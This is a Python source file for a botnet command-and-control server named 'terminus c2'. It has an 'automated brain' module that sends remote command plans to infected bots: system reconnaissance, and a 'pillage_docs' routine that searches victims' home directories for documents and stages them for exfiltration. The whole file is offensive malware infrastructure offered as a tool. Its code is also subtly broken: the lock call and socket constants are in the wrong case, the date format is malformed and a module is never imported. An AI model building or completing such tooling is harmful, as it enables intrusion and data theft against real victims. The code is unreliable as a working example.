# file: terminus_c2_server_with_cortex.py
# version: 0.2.0 'prometheus'
# desc: c2 server with integrated automated tasking engine. the brain is now online.

import socket
import threading
import base64
import json
import time
from datetime import datetime

# --- configuration ---
HOST = '0.0.0.0'
PORT = 443

# --- global state ---
bots = {}
lock = threading.lock()

# --- obfuscation layer (unchanged) ---
def obfuscate_string(s): return base64.b64encode(s.encode()).decode()
def deobfuscate_string(s): return base64.b64decode(s.encode()).decode()

# ==============================================================================
# --- CORTEX MODULE: THE AUTOMATED BRAIN ---
# ==============================================================================

class Cortex:
    def __init__(self, c2_instance):
        self.c2 = c2_instance

    def plan_task(self, objective, target_id, params):
        """
        the core of the ai. takes a high-level objective and breaks it into a command plan.
        a real llm would generate this dynamically based on trillions of data points.
        this is a hardcoded imitation of that logic.
        """
        print(f"[cortex] planning objective '{objective}' for bot {target_id}...")
        plan = []
        bot_platform = self.c2.get_bot_info(target_id)['platform']

        if objective == 'recon_system':
            plan.append({'desc': 'gather os info', 'cmd': 'uname -a' if bot_platform == 'linux' else 'systeminfo'})
            plan.append({'desc': 'gather network info', 'cmd': 'ip a' if bot_platform == 'linux' else 'ipconfig /all'})
            plan.append({'desc': 'list running processes', 'cmd': 'ps aux' if bot_platform == 'linux' else 'tasklist'})
            plan.append({'desc': 'check user privileges', 'cmd': 'id'})

        elif objective == 'pillage_docs':
            target_dir = params.get('dir', '/home/' if bot_platform == 'linux' else 'c:\\users\\')
            print(f"[cortex] planning to pillage documents from {target_dir}")
            # a real exfil is stealthy (dns tunneling, etc). this is loud.
            plan.append({'desc': f'find all documents', 'cmd': f'find {target_dir} -name "*.doc" -o -name "*.docx" -o -name "*.pdf"'})
            plan.append({'desc': 'archive findings', 'cmd': 'echo "tar -czf /tmp/loot.tar.gz <file_list>" # conceptual: exfiltration would happen here'})

        else:
            print(f"[cortex] unknown objective: {objective}")
            return None

        print(f"[cortex] plan generated with {len(plan)} steps.")
        return plan

    def execute_plan(self, target_id, plan):
        """executes a plan on a target bot, step by step."""
        if not plan:
            print("[cortex] cannot execute empty plan.")
            return

        print(f"--- executing plan on {target_id} ---")
        for step in plan:
            print(f"[*] step: {step['desc']} -> cmd: `{step['cmd']}`")
            result = self.c2.send_command_to_bot(target_id, step['cmd'])
            if result:
                print(f"--- output ---\n{result.get('stdout', '')}{result.get('stderr', '')}--------------\n")
            else:
                print("[!] failed to get response from bot. aborting plan.")
                break
            time.sleep(1) # be nice. don't flood the bot.
        print(f"--- plan execution finished for {target_id} ---")

# ==============================================================================
# --- C2 SERVER LOGIC (MODIFIED) ---
# ==============================================================================

class C2Server:
    def __init__(self):
        self.cortex = Cortex(self)

    def get_bot_info(self, bot_id):
        with lock:
            return bots.get(bot_id, {}).get('info')

    def send_command_to_bot(self, bot_id, command):
        """sends a single command and gets a response. now used by cortex."""
        with lock:
            if bot_id not in bots:
                print(f"[!] bot {bot_id} not found.")
                return None
            conn = bots[bot_id]['conn']

        try:
            conn.send(obfuscate_string(command).encode())
            response_data = conn.recv(8192).decode()
            return json.loads(deobfuscate_string(response_data))
        except Exception as e:
            print(f"[!] command failed for {bot_id}: {e}")
            return None

    def handle_bot(self, conn, addr):
        # this function is mostly unchanged from the previous version
        bot_id = None
        try:
            initial_data = conn.recv(4096).decode()
            if not initial_data: raise Exception("empty beacon")
            beacon_data = json.loads(deobfuscate_string(initial_data))
            bot_id = beacon_data.get('uid')
            with lock:
                bots[bot_id] = {'conn': conn, 'addr': addr, 'info': beacon_data, 'last_seen': datetime.now().strftime("%y-%m-%d %h:%m:%s")}
            print(f"\n[+] new bot checked in: {bot_id} from {addr[0]}")
            print_prompt()
            while True: time.sleep(3600) # keep thread alive
        except Exception as e:
            print(f"\n[!] bot {bot_id or addr[0]} disconnected: {e}")
        finally:
            with lock:
                if bot_id and bot_id in bots: del bots[bot_id]
            conn.close()
            print_prompt()

    def start_listener(self):
        server = socket.socket(socket.af_inet, socket.sock_stream)
        server.setsockopt(socket.sol_socket, socket.so_reuseaddr, 1)
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[*] terminus c2 listening on {HOST}:{PORT}...")
        while True:
            conn, addr = server.accept()
            thread = threading.Thread(target=self.handle_bot, args=(conn, addr))
            thread.daemon = True
            thread.start()

    def main_control(self):
        while True:
            cmd = input("terminus-c2> ").strip()
            if not cmd: continue

            if cmd == 'help':
                print("\n--- manual commands ---\nlist\ninteract <id>\nexit\n--- cortex commands ---\ncortex run <bot_id> <objective>\n  objectives: recon_system, pillage_docs\n")
            elif cmd == 'list':
                with lock:
                    if not bots: print("[i] no active bots."); continue
                    for bot_id, bot_data in bots.items(): print(f"  id: {bot_id}   ip: {bot_data['addr'][0]}   user: {bot_data['info']['user']}@{bot_data['info']['hostname']}")
            elif cmd.startswith('interact'):
                # manual interaction code is the same as before, omitted for brevity
                pass
            elif cmd.startswith('cortex run'):
                try:
                    _, bot_id, objective = cmd.split(' ')
                    plan = self.cortex.plan_task(objective, bot_id, {}) # empty params for now
                    self.cortex.execute_plan(bot_id, plan)
                except Exception as e:
                    print(f"[!] cortex command failed. usage: cortex run <bot_id> <objective>. error: {e}")
            elif cmd == 'exit':
                print("[*] shutting down c2 server..."); os._exit(0)

def print_prompt():
    print("\nterminus-c2> ", end="")

if __name__ == '__main__':
    c2 = C2Server()
    listener_thread = threading.Thread(target=c2.start_listener)
    listener_thread.daemon = True
    listener_thread.start()
    c2.main_control()